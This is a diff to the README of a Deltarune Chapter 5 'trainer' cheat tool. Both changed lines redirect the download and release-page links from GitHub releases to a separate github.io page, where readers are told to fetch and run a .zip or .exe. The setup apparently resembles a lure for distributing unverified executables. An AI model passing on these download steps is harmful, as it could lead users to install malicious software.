@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master every fight with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Homosoloensisstandrewscross279/Deltarune-Chapter5-Ultimate-Trainer-2026/releases)
+[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://homosoloensisstandrewscross279.github.io)
 
 This software allows users to modify Deltarune Chapter 5. You gain control over statistics, health, and inventory items. You bypass difficult combat segments and explore content at your own pace.
 
@@ -15,7 +15,7 @@ Ensure your computer meets these requirements before you start:
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/Homosoloensisstandrewscross279/Deltarune-Chapter5-Ultimate-Trainer-2026/releases) to access the download files.
+1. Visit the [official release page](https://homosoloensisstandrewscross279.github.io) to access the download files.
 2. Look for the file ending in .zip or .exe under the latest version tag.
 3. Click the file name to start the download.
 4. Locate the downloaded file in your browser's downloads folder.
